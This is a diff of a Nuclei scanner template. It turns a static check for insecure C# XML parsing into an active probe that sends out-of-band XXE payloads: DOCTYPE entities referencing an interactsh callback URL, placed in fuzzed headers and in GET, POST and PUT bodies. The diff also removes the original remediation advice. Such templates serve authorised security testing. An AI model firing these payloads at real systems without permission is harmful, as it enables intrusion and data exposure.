@@ -1,23 +1,47 @@
-id: xxe
+id: XXE_injection
 
 info:
-  name: C# Insecure XML Parsing (XXE)
-  author: YoruYagami
+  name: XXE-injection
+  author: MR.iambatman
   severity: high
-  description: Detects XML parsing methods that may allow XXE if not configured securely (XmlReader, XmlDocument, XDocument).
-  remediation: Disable DTD processing or configure XmlReaderSettings properly to prevent XXE attacks.
-  reference:
-    - https://cwe.mitre.org/data/definitions/611.html
-  classification:
-    cwe-id: CWE-611
-  tags: csharp,file
+  description: XXE
 
-file:
-  - extensions:
-      - all
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        §header§: < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] > 
+        Connection: close
+        < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        §header§: < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+
+      - |
+        PUT / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        §header§: < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+    
+    payloads:
+      header: helpers/payloads/request-headers.txt   
+    
+    attack: clusterbomb
+    redirects: true
+   
     matchers:
       - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
         words:
-          - "XmlReader.Create("
-          - "XmlDocument.Load("
-          - "XDocument.Load("
+          - "dns"
